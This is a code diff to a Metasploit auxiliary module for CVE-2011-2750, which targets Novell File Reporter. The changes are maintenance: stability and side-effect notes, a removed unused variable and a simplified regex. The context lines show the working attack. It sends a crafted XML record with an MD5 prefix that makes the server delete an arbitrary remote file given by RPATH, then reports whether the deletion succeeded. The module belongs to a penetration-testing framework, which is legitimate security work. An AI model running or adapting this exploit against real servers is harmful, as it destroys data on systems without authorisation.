@@ -26,7 +26,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2011-2750' ],
           [ 'OSVDB', '73729' ],
           [ 'URL', 'http://aluigi.org/adv/nfr_2-adv.txt'],
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [OS_RESOURCE_LOSS],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -40,7 +45,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    peer = "#{rhost}:#{rport}"
     record = "<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>5</CMD><PATH>#{datastore['RPATH']}</PATH></RECORD>"
     md5 = Rex::Text.md5('SRS' + record + 'SERVER').upcase
     message = md5 + record
@@ -57,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       }, 5
     )
 
-    if res && (res.code == 200) && res.body =~ (%r{<RESULT><VERSION>1</VERSION><STATUS>0</STATUS><TRANSID>0</TRANSID></RESULT>})
+    if res && (res.code == 200) && res.body =~ %r{<RESULT><VERSION>1</VERSION><STATUS>0</STATUS><TRANSID>0</TRANSID></RESULT>}
       print_good("File #{datastore['RPATH']} successfully deleted")
     else
       print_error('File not deleted')
